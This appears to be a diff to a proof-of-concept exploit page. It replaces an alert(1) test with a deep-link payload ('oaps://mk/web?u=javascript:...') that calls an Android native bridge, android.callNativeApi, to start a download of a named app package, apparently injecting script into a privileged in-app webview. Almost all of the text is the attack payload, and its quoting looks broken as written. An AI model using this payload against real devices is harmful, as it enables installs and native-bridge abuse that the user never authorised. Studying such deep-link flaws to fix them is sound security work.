@@ -9,7 +9,14 @@
 
 
 <script>
-window.location.href='oaps://mk/web?u=javascript:alert(1)';
+window.location.href='oaps://mk/web?u=javascript:var json = {
+            'type': 'download_start',
+            'json': {
+                'pkg': 'com.sankuai.meituan',
+                'id': 1122334
+            }
+        }
+        android.callNativeApi(JSON.stringify(json));';
 
 </script>
 
